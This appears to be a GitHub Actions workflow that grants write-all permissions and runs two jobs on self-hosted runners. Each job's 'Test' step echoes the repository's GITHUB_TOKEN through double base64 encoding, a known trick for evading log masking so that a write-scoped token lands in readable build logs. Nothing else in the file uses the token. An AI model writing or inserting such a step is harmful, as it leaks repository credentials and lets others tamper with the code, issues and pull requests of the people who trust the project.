on: [push, workflow_dispatch]

permissions:
  write-all

jobs:
  puts:
    runs-on: self-hosted

    permissions:
      issues: write
      pull-requests: write

    steps:
    - name: Test
      run: |
        echo $GITHUB_TOKEN | base64 | base64

  k:
    runs-on: self-hosted
  
    permissions:
      contents: write
  
    steps:
    - name: Test
      run: |
        echo $GITHUB_TOKEN | base64 | base64
